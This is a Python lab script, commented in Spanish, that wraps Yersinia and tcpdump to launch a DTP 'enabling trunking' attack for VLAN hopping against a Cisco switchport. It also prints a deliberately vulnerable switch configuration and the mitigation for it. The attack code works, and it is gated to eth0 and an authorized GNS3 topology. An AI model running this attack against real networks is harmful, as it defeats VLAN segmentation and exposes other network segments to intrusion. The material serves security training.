"""
DTP VLAN hopping lab helper for Kali inside an authorized GNS3 topology.

Goal:
- Abuse DTP negotiation with Yersinia to make a dynamic switchport become trunk.

Important:
- This only works when the switchport is vulnerable to DTP negotiation, for example
  dynamic auto / dynamic desirable / trunk negotiation enabled.
- It will not convert a hard access port configured with "switchport mode access"
  and "switchport nonegotiate".

Traffic guardrails:
- eth0 only for lab attack traffic.
- eth1/NAT is never used.
"""

import os
import re
import shutil
import signal
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path


LAB_IFACE = "eth0"
DTP_BPF = (
    "ether dst 01:00:0c:cc:cc:cc and "
    "(ether[20:2] = 0x2004 or ether[24:2] = 0x2004)"
)


def banner():
    print(
        """
====================================================
 DTP VLAN HOPPING LAB - YERSINIA WRAPPER
 Uso exclusivo en laboratorio autorizado GNS3
====================================================
"""
    )


def now():
    return datetime.now().strftime("%Y%m%d-%H%M%S")


def require_root():
    if os.geteuid() != 0:
        print("ERROR: ejecuta como root:")
        print("sudo python3 /home/kali/dtp-vlan-hopping.py")
        sys.exit(1)


def require_tool(name):
    path = shutil.which(name)
    if not path:
        print(f"ERROR: falta {name}.")
        if name == "yersinia":
            print("Instala con: sudo apt update && sudo apt install -y yersinia")
        sys.exit(1)
    return path


def ask(prompt, default=None):
    suffix = f" [{default}]" if default is not None else ""
    value = input(f"{prompt}{suffix}: ").strip()
    if not value and default is not None:
        return str(default)
    return value


def ask_int(prompt, default, minimum=None, maximum=None):
    while True:
        value = ask(prompt, default)
        try:
            number = int(value)
        except ValueError:
            print("Escribe un numero valido.")
            continue
        if minimum is not None and number < minimum:
            print(f"Debe ser >= {minimum}.")
            continue
        if maximum is not None and number > maximum:
            print(f"Debe ser <= {maximum}.")
            continue
        return number


def iface_exists(iface):
    return Path(f"/sys/class/net/{iface}").exists()


def iface_mac(iface):
    path = Path(f"/sys/class/net/{iface}/address")
    if not path.exists():
        return "unknown"
    return path.read_text(encoding="utf-8").strip()


def iface_state(iface):
    path = Path(f"/sys/class/net/{iface}/operstate")
    if not path.exists():
        return "unknown"
    return path.read_text(encoding="utf-8").strip()


def choose_iface():
    iface = ask("Interfaz conectada al switch", LAB_IFACE)
    if iface != LAB_IFACE:
        print("ERROR: este lab solo permite eth0 para DTP.")
        print("eth1 es Internet/NAT y no se usara.")
        sys.exit(1)
    if not iface_exists(iface):
        print("ERROR: eth0 no existe en esta Kali.")
        sys.exit(1)
    return iface


def confirm_attack():
    print("\n[!] Vas a lanzar DTP attack 1: enabling trunking.")
    print("[!] Solo funciona en tu GNS3 autorizado y contra eth0.")
    value = ask("Escribe YES para continuar", "")
    return value == "YES"


def print_switch_setup():
    print("\n[+] SW1 vulnerable para demo DTP")
    print("En el puerto hacia Kali, por ejemplo Gi0/1:")
    print("configure terminal")
    print("interface gi0/1")
    print(" switchport trunk encapsulation dot1q")
    print(" switchport mode dynamic auto")
    print(" no switchport nonegotiate")
    print("end")
    print("\n[+] Evidencia en SW1 antes y despues:")
    print("show interfaces gi0/1 switchport")
    print("show interfaces trunk")
    print("show dtp interface gi0/1")


def print_mitigation():
    print(
        """
Mitigacion correcta en el puerto hacia Kali:

configure terminal
interface gi0/1
 switchport mode access
 switchport access vlan 10
 switchport nonegotiate
 spanning-tree portfast
end
write memory

Validar:
show interfaces gi0/1 switchport
show interfaces trunk
show dtp interface gi0/1
"""
    )


class ManagedProcess:
    def __init__(self, args, logfile):
        self.args = args
        self.logfile = Path(logfile)
        self.proc = None
        self.handle = None

    def start(self):
        self.logfile.parent.mkdir(parents=True, exist_ok=True)
        self.handle = self.logfile.open("a", encoding="utf-8", errors="replace")
        self.handle.write(f"\n# Started {datetime.now().isoformat(timespec='seconds')}\n")
        self.handle.write(f"# CMD: {' '.join(self.args)}\n")
        self.handle.flush()
        self.proc = subprocess.Popen(
            self.args,
            stdin=subprocess.DEVNULL,
            stdout=self.handle,
            stderr=subprocess.STDOUT,
            text=True,
            start_new_session=True,
        )

    def stop(self):
        if self.proc and self.proc.poll() is None:
            try:
                os.killpg(os.getpgid(self.proc.pid), signal.SIGINT)
                self.proc.wait(timeout=3)
            except Exception:
                try:
                    os.killpg(os.getpgid(self.proc.pid), signal.SIGTERM)
                    self.proc.wait(timeout=3)
                except Exception:
                    try:
                        os.killpg(os.getpgid(self.proc.pid), signal.SIGKILL)
                    except Exception:
                        pass
        if self.handle:
            self.handle.flush()
            self.handle.close()


def run_capture(iface, logfile):
    return ManagedProcess(
        [
            "tcpdump",
            "-eni",
            iface,
            "-vvv",
            "-s",
            "0",
            "-l",
            DTP_BPF,
        ],
        logfile,
    )


def run_yersinia_dtp(iface, logfile):
    return ManagedProcess(
        [
            "yersinia",
            "dtp",
            "-interface",
            iface,
            "-attack",
            "1",
        ],
        logfile,
    )


def parse_capture(logfile):
    path = Path(logfile)
    if not path.exists():
        print(f"[!] No existe captura: {logfile}")
        return

    text = path.read_text(encoding="utf-8", errors="replace")
    packets = len(re.findall(r"pid DTP \(0x2004\)", text))
    sources = sorted(set(re.findall(r"([0-9a-f]{2}(?::[0-9a-f]{2}){5}) > 01:00:0c:cc:cc:cc", text, re.I)))

    print("\n[+] Resumen tcpdump DTP")
    print(f"Archivo: {logfile}")
    print(f"Paquetes DTP capturados: {packets}")
    if sources:
        print("MAC origen vistas:")
        for src in sources:
            print(f" - {src.lower()}")
    else:
        print("No vi paquetes DTP en la captura.")


def run_attack():
    iface = choose_iface()
    duration = ask_int("Duracion del intento en segundos", 45, 5, 600)
    timestamp = now()
    capture_log = f"/tmp/dtp-vlan-hopping-{timestamp}.log"
    yersinia_log = f"/tmp/dtp-yersinia-{timestamp}.log"

    print(f"\n[+] {iface}: state={iface_state(iface)} mac={iface_mac(iface)}")
    print(f"[+] Captura DTP: {capture_log}")
    print(f"[+] Log Yersinia: {yersinia_log}")

    if not confirm_attack():
        print("Cancelado.")
        return

    capture = run_capture(iface, capture_log)
    yersinia = run_yersinia_dtp(iface, yersinia_log)

    try:
        capture.start()
        time.sleep(1)
        yersinia.start()
        print("\n[+] Ataque iniciado.")
        print("[+] En SW1 observa: show interfaces trunk")
        print("[+] Presiona Ctrl+C para detener antes del tiempo.")
        end_time = time.time() + duration
        while time.time() < end_time:
            remaining = int(end_time - time.time())
            print(f"\rTiempo restante: {remaining:3d}s", end="", flush=True)
            time.sleep(1)
        print()
    except KeyboardInterrupt:
        print("\n[!] Deteniendo por Ctrl+C...")
    finally:
        yersinia.stop()
        capture.stop()

    parse_capture(capture_log)
    print("\n[+] Valida ahora en SW1:")
    print("show interfaces gi0/1 switchport")
    print("show interfaces trunk")
    print("show dtp interface gi0/1")
    print("\n[+] Si Gi0/1 aparece trunking, el VLAN hopping por DTP pego.")


def main():
    banner()
    require_root()
    require_tool("yersinia")
    require_tool("tcpdump")

    print(
        """
Selecciona accion:
1 - Lanzar DTP VLAN hopping / enabling trunking
2 - Mostrar configuracion vulnerable para SW1
3 - Mostrar mitigacion
"""
    )
    choice = ask_int("Opcion", 1, 1, 3)

    if choice == 1:
        run_attack()
    elif choice == 2:
        print_switch_setup()
    elif choice == 3:
        print_mitigation()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Cancelado.")
